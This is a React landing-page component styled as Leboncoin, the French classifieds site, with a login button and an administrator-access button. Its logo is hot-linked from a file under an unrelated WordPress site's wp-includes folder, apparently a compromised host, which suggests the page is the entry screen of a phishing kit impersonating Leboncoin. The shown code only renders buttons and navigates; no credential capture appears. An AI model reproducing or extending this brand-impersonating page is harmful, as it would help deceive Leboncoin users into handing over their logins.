
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";

const Index = () => {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white p-6">
      <div className="w-full max-w-md mx-auto flex flex-col items-center space-y-8">
        <img 
          src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" 
          alt="Leboncoin Logo" 
          className="h-12 mb-8"
        />
        
        <div className="w-full space-y-4">
          <Button 
            className="w-full py-6 bg-leboncoin-orange hover:bg-leboncoin-orange/90 text-lg font-medium rounded-full"
            onClick={() => navigate("/login")}
          >
            Se connecter
          </Button>
          
          <Button 
            className="w-full py-6 bg-white hover:bg-gray-100 text-leboncoin-orange border border-leboncoin-orange text-lg font-medium rounded-full"
            variant="outline"
            onClick={() => navigate("/admin")}
          >
            Accès administrateur
          </Button>
        </div>
      </div>
    </div>
  );
};

export default Index;
